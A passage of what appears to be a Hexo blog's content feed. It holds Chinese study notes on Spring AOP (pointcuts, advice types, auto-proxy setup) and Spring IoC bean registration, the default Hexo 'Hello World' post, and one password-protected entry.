class="hljs-built_in">getName</span>());<br>    &#125;<br><br>    <span class="hljs-comment">// 后置通知</span><br>    @<span class="hljs-selector-tag">After</span>(<span class="hljs-string">&quot;controllerMethods()&quot;</span>)<br>    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">void</span> <span class="hljs-selector-tag">logAfterController</span>(JoinPoint joinPoint) &#123;<br>        <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.out</span><span class="hljs-selector-class">.println</span>(<span class="hljs-string">&quot;Controller method executed: &quot;</span> + joinPoint.<span class="hljs-built_in">getSignature</span>().<span class="hljs-built_in">getName</span>());<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.内联切点定义与通知&#x3D;&#x3D;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">在这种方式中，切点直接内联在通知上，切点和通知定义在一起。这种方式代码更加简洁，适合简单的场景，尤其是只有少量切点和通知的情况。</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">@Aspect</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoggingAspect</span> &#123;<br>    <br>    <span class="hljs-comment">// 切点 + 前置通知</span><br>    <span class="hljs-meta">@Before(&quot;execution(* com.example.UserService.do1()) || execution(* com.example.UserService.do3())&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">logBeforeController</span><span class="hljs-params">(JoinPoint joinPoint)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Controller method executing: &quot;</span> + joinPoint.getSignature().getName());<br>    &#125;<br><br>    <span class="hljs-comment">// 切点 + 后置通知</span><br>    <span class="hljs-meta">@After(&quot;execution(* com.example.UserService.do1()) || execution(* com.example.UserService.do3())&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">logAfterController</span><span class="hljs-params">(JoinPoint joinPoint)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Controller method executed: &quot;</span> + joinPoint.getSignature().getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="2-5-5、通知（Advice）"><a href="#2-5-5、通知（Advice）" class="headerlink" title="2.5.5、通知（Advice）"></a>2.5.5、通知（Advice）</h5><h6 id="2-5-5-1、通知概述"><a href="#2-5-5-1、通知概述" class="headerlink" title="2.5.5.1、通知概述"></a>2.5.5.1、通知概述</h6><p>通知是切面中具体的操作逻辑，它定义了在特定的连接点（如方法执行前、后、抛出异常时等）时执行的行为。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Before(&quot;execution(* com.example.service.*.*(..))&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">logBefore</span><span class="hljs-params">(JoinPoint joinPoint)</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;Before method: &quot;</span> + joinPoint.getSignature());<br>&#125;<br></code></pre></td></tr></table></figure><hr><h6 id="2-5-5-2、通知的种类"><a href="#2-5-5-2、通知的种类" class="headerlink" title="2.5.5.2、通知的种类"></a>2.5.5.2、通知的种类</h6><ol><li><strong>环绕通知（@Around ）</strong>：围绕目标方法执行，既可以在方法前，也可以在方法后执行，还可以决定是否执行目标方法（最强大，也最常用）。</li><li><strong>前置通知（@Before）</strong>：在目标方法执行前执行。</li><li><strong>后置通知（@AfterRetruning）</strong>：在目标方法执行后执行（无论是否抛出异常）。</li><li><strong>异常通知（@AfterThrowing）</strong>：在目标方法抛出异常时执行。</li><li><strong>最终通知（@After）</strong>：在目标方法执行后最终执行，无论方法是正常返回还是抛出异常。</li></ol><hr><h6 id="2-5-5-3、通知的顺序"><a href="#2-5-5-3、通知的顺序" class="headerlink" title="2.5.5.3、通知的顺序"></a>2.5.5.3、通知的顺序</h6><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Aop/image-20250311103243112.png"></p><hr><h6 id="2-5-5-4、通知的应用方法"><a href="#2-5-5-4、通知的应用方法" class="headerlink" title="2.5.5.4、通知的应用方法"></a>2.5.5.4、通知的应用方法</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@Aspect(1)</span> <span class="hljs-comment">// 指定多个通知之间的执行顺序</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAspect</span> &#123;<br><br><span class="hljs-comment">// 环绕通知：@Around</span><br><span class="hljs-meta">@Around(&quot;execution(* com.powernode.spring6.service.OrderService.*(..))&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">aroundAdvice</span><span class="hljs-params">(ProceedingJoinPoint proceedingJoinPoint)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>     <span class="hljs-comment">// 前方法</span><br>System.out.println(<span class="hljs-string">&quot;环绕通知开始&quot;</span>);<br><span class="hljs-comment">// 固定写法</span><br>proceedingJoinPoint.proceed();<br> <span class="hljs-comment">// 后写法</span><br>System.out.println(<span class="hljs-string">&quot;环绕通知结束&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 前置通知：@Before</span><br><span class="hljs-meta">@Before(&quot;execution(* com.powernode.spring6.service.OrderService.*(..))&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">beforeAdvice</span><span class="hljs-params">()</span> &#123;<br>System.out.println(<span class="hljs-string">&quot;前置通知&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 后置通知：@AfterRetruning</span><br><span class="hljs-meta">@AfterReturning(&quot;execution(* com.powernode.spring6.service.OrderService.*(..))&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterReturningAdvice</span><span class="hljs-params">()</span> &#123;<br>System.out.println(<span class="hljs-string">&quot;后置通知&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 异常通知：@AfterThrowing</span><br><span class="hljs-meta">@AfterThrowing(&quot;execution(* com.powernode.spring6.service.OrderService.*(..))&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterThrowingAdvice</span><span class="hljs-params">()</span> &#123;<br>System.out.println(<span class="hljs-string">&quot;异常通知&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 最终通知：@After</span><br><span class="hljs-meta">@After(&quot;execution(* com.powernode.spring6.service.OrderService.*(..))&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterAdvice</span><span class="hljs-params">()</span> &#123;<br>System.out.println(<span class="hljs-string">&quot;最终通知&quot;</span>);<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="2-5-6、织入（Weaving）"><a href="#2-5-6、织入（Weaving）" class="headerlink" title="2.5.6、织入（Weaving）"></a>2.5.6、织入（Weaving）</h5><p>织入是将切面与目标程序类型结合的过程，决定了切面何时以及如何应用。不同框架的织入时机有所不同，Spring AOP 的织入发生在运行时，切面会动态地应用到目标对象的连接点上。</p><hr><h5 id="2-5-7、代理对象（Proxy）"><a href="#2-5-7、代理对象（Proxy）" class="headerlink" title="2.5.7、代理对象（Proxy）"></a>2.5.7、代理对象（Proxy）</h5><p>代理对象是由 AOP 框架创建的，它是在目标对象被织入切面后生成的新对象。作为目标对象的包装，代理对象将切面逻辑与目标对象的业务逻辑结合起来。它封装了目标对象的所有方法，并在方法调用时执行相应的切面增强逻辑（通知）。</p><hr><h1 id="二、实操"><a href="#二、实操" class="headerlink" title="二、实操"></a>二、实操</h1><h3 id="1、基本开发步骤"><a href="#1、基本开发步骤" class="headerlink" title="1、基本开发步骤"></a>1、基本开发步骤</h3><h4 id="1-1、前言：配置方式-概述"><a href="#1-1、前言：配置方式-概述" class="headerlink" title="1.1、前言：配置方式 概述"></a>1.1、前言：配置方式 概述</h4><p>在 Spring AOP 中，通常有以下三种方法进行配置：</p><ol><li>&#x3D;&#x3D;基于注解的 AOP&#x3D;&#x3D;：结合 Spring 框架和 AspectJ 框架，通过注解来定义切面和切点。</li><li>&#x3D;&#x3D;基于 XML 的 AOP&#x3D;&#x3D;：同样结合 Spring 和 AspectJ，通过 XML 配置来定义切面和切点。</li><li>&#x3D;&#x3D;Spring 自有的 AOP 实现&#x3D;&#x3D;：基于 XML 配置，使用 Spring 自身的 AOP 功能。</li></ol><p>在实际开发中，通常使用 Spring + AspectJ 的组合，我们学习第一种。</p><hr><h4 id="1-2、创建-Spring-AOP-项目"><a href="#1-2、创建-Spring-AOP-项目" class="headerlink" title="1.2、创建 Spring AOP 项目"></a>1.2、创建 Spring AOP 项目</h4><p>在创建 Spring IOC 项目（引入 <a href="https://mvnrepository.com/artifact/org.springframework/spring-context">Spring Context 依赖</a>）的基础上，再引入 <a href="https://mvnrepository.com/artifact/org.springframework/spring-aop">Spring AOP 依赖</a>、<a href="https://mvnrepository.com/artifact/org.springframework/spring-aspects">Spring Aspects 依赖</a>、<a href="https://mvnrepository.com/artifact/org.aspectj/aspectjweaver">Aspectj Weaver 依赖</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 1. Spring Context 依赖 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-context<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>xxxxxx<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <br>    <span class="hljs-comment">&lt;!-- 2. Spring AOP 核心依赖 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-aop<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>xxxxxx<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 3. Spring AOP 的注解支持 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-aspects<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>xxxxxx<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 4. AspectJ 语言支持 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjweaver<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>xxxxxx<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h4 id="1-3、找到目标对象"><a href="#1-3、找到目标对象" class="headerlink" title="1.3、找到目标对象"></a>1.3、找到目标对象</h4><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// 目标类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-comment">// 目标方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">createUser</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> username</span>) &#123;<br>        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;User created: &quot;</span> + username);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h4 id="1-4、创建切面，定义切点、通知"><a href="#1-4、创建切面，定义切点、通知" class="headerlink" title="1.4、创建切面，定义切点、通知"></a>1.4、创建切面，定义切点、通知</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@Aspect</span> <span class="hljs-comment">// 在 Java 中，一个切面就是一个 @Aspect 标注的切面类</span><br><span class="hljs-variable">@Order</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">// 规定在多个切面中，本切面的执行顺序，数字越小越先执行</span><br>public class LoggingAspect &#123;<br>    ......<br>&#125;<br></code></pre></td></tr></table></figure><hr><h4 id="1-5、将目标对象、切面声明为-Bean"><a href="#1-5、将目标对象、切面声明为-Bean" class="headerlink" title="1.5、将目标对象、切面声明为 Bean"></a>1.5、将目标对象、切面声明为 Bean</h4><p>&#x3D;&#x3D;1.目标对象声明为 Bean&#x3D;&#x3D;</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// 目标类</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">createUser</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> username</span>) &#123;<br>        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;User created: &quot;</span> + username);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.切面对象声明为 Bean&#x3D;&#x3D;</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@Component</span><br><span class="hljs-variable">@Aspect</span> <span class="hljs-comment">// 在 Java 中，一个切面就是一个 @Aspect 标注的切面类</span><br><span class="hljs-variable">@Order</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">// 规定在多个切面中，本切面的执行顺序，数字越小越先执行</span><br>public class LoggingAspect &#123;<br>    ......<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 疑问：为什么要将目标对象、切面声明为 Bean</p><ol><li>使得 Spring AOP 能够在运行时自动为符合切点条件的 Bean 生成代理对象，从而实现 AOP 功能的自动织入。</li></ol></blockquote><hr><h4 id="1-6、启用-AspectJ-自动代理功能"><a href="#1-6、启用-AspectJ-自动代理功能" class="headerlink" title="1.6、启用 AspectJ 自动代理功能"></a>1.6、启用 AspectJ 自动代理功能</h4><p>在 Spring IoC 的配置类中，通过使用 <code>@EnableAspectJAutoProxy</code> 注解来启用 AspectJ 的自动代理功能。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-comment">// 配置类</span><br><span class="hljs-variable">@Configuration</span><br><span class="hljs-variable">@EnableAspectJAutoProxy</span> <span class="hljs-comment">// 启用 AspectJ 自动代理</span><br>public class ApplicationContextConfig &#123;<br>    <span class="hljs-comment">// 配置类内容</span><br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="2、Boot-简化开发"><a href="#2、Boot-简化开发" class="headerlink" title="2、Boot 简化开发"></a>2、Boot 简化开发</h3>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Spring 生态</category>
      
      <category>Spring Aop</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/03/10/hello-world/"/>
    <url>/2025/03/10/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Hexo + Obsidian +Git Page</title>
    <link href="/2025/03/10/%E7%AC%94%E8%AE%B0%EF%BC%9AHexo%20+%20Obsidian%20+Git%20Page/"/>
    <url>/2025/03/10/%E7%AC%94%E8%AE%B0%EF%BC%9AHexo%20+%20Obsidian%20+Git%20Page/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="652234cccd1f994995292b69655eecc2dba7e804cc56490057a7106356eb355f"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>博客建站</category>
      
      <category>Hexo + Obsidian + GitPage</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Spring IOC</title>
    <link href="/2025/03/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20IOC/"/>
    <url>/2025/03/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20IOC/</url>
    
    <content type="html"><![CDATA[<h2 id="两种注册方式啊"><a href="#两种注册方式啊" class="headerlink" title="两种注册方式啊"></a>两种注册方式啊</h2><p><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/pring%20IOC/image-20250703103102608.png"></p><p><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/pring%20IOC/image-20250703103116668.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li>如果我们是使用 <code>AuthenticationManager</code> 进行认证，它会自动将用户发送来的用户名和密码，与我们的 <code>CustomerUserDetailsImpl</code> 中返回的用户名和密码进行比对，这是我们已知的逻辑。那你可能会有疑问：它在比对前，肯定需要先用密码加密器对用户发送来的明文密码进行加密，然后再比对吧？可我并没有做任何相关配置，<code>AuthenticationManager</code> 怎么知道该使用哪个加密器？</li><li>其实，只要你注册了一个类型为 <code>PasswordEncoder</code> 的 接口 Bean，这个 接口 Bean 有一个具体实现，<code>AuthenticationManager</code> 就会知道使用这个 <code>PasswordEncoder</code> Bean 与其具体实现，对密码进行加密，<strong>无需我们手动配置</strong>。</li><li>同样的，只要你注册了一个类型为 <code>UserDetailsService</code> 的 Bean（接口 Bean），这个 接口 Bean 有一个具体的实现，<code>AuthenticationManager</code> 就会知道使用这个 <code>UserDetailsService</code> Bean 与其具体实现，去获取 <code>CustomerUserDetailsImpl</code> <strong>无需我们手动配置</strong>。</li><li>上述，只限于接口 Bean 只有一个具体实现，如果有多个具体实现，那就要我们进行配置了，因为 Spring Security 虽然知道用这个 Bean，但是并不知道使用哪一个具体实现</li></ol></blockquote><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs markdown">/**<br><span class="hljs-bullet"> *</span> ============================================<br><span class="hljs-bullet"> *</span> Spring IoC 声明 Bean 的常用方式 1<br><span class="hljs-bullet"> *</span> --------------------------------------------<br><span class="hljs-bullet"> *</span> 概念：<br><span class="hljs-bullet"> *</span> - 同时注册了 UserDetailsService 接口类型的 Bean 和 CustomerUserDetailsImplService 实现类类型的 Bean<br><span class="hljs-bullet"> *</span> - CustomerUserDetailsImplService 是该接口的一个具体实现类，IoC 容器中可能存在多个这样的实现类 Bean<br><span class="hljs-bullet"> *</span> - 我们既可以注入 CustomerUserDetailsImplService 类 Bean，也可以注入 UserDetailsService 接口 Bean<br><span class="hljs-bullet"> *</span> - 如果注入的是 UserDetailsService，且只有一个实现类，那么调用接口方法时，实际就是调用该实现类的方法<br><span class="hljs-bullet"> *</span> - 如果存在多个实现类，则需要通过配置明确指定使用哪个实现类<br><span class="hljs-bullet"> *</span> - 简而言之，此方式支持一个接口 Bean 有多个实现类 Bean，切换实现时只需调整配置，指定使用哪一个实现即可<br><span class="hljs-bullet"> *</span> ============================================<br> <span class="hljs-emphasis">*/</span><br><span class="hljs-emphasis">@Service</span><br><span class="hljs-emphasis">public class CustomerUserDetailsImplService implements UserDetailsService &#123;</span><br><span class="hljs-emphasis">......</span><br><span class="hljs-emphasis">&#125;</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">/*</span>*<br><span class="hljs-bullet"> *</span> ============================================<br><span class="hljs-bullet"> *</span> Spring IoC 声明 Bean 的常用方式 2<br><span class="hljs-bullet"> *</span> --------------------------------------------<br><span class="hljs-bullet"> *</span> 概念：<br><span class="hljs-bullet"> *</span> - 仅注册了 UserDetailsService 类型的 Bean，返回的 CustomerUserDetailsImplService 实例是其具体实现类<br><span class="hljs-bullet"> *</span> - 此方式下，一个接口 Bean 只能绑定一个实现类，若要更换实现，需在此方法中直接修改返回的实例。<br><span class="hljs-bullet"> *</span> ============================================<br> <span class="hljs-emphasis">*/</span><br><span class="hljs-emphasis">@Bean</span><br><span class="hljs-emphasis">public UserDetailsService userDetailsService() &#123;</span><br><span class="hljs-emphasis">    return new CustomerUserDetailsImplService();</span><br><span class="hljs-emphasis">&#125;</span><br></code></pre></td></tr></table></figure><hr><p><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/pring%20IOC/image-20250701205019198.png"></p><p><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/pring%20IOC/image-20250701205226473.png"></p><p>其实这就是 Spring IOC 的核心思想了，对吧，你的接口这些方法都已经制定好了</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> interface PasswordEncoder &#123;  <br>    <span class="hljs-function"><span class="hljs-type">String</span> <span class="hljs-title">encode</span><span class="hljs-params">(CharSequence rawPassword)</span></span>;  <br>  <br>    <span class="hljs-function"><span class="hljs-type">boolean</span> <span class="hljs-title">matches</span><span class="hljs-params">(CharSequence rawPassword, <span class="hljs-type">String</span> encodedPassword)</span></span>;  <br>  <br>    <span class="hljs-function"><span class="hljs-keyword">default</span> <span class="hljs-type">boolean</span> <span class="hljs-title">upgradeEncoding</span><span class="hljs-params">(<span class="hljs-type">String</span> encodedPassword)</span> </span>&#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>然后这些实现，都会去实现你这些方法，我们将接口直接声明为 Bean，然后选择一个合适的实现类进行返回，其实这个接口呢，就可以使用这个实现类实现的方法，以后如果我们要修改实现类，只需要修改以下这个return new BCY 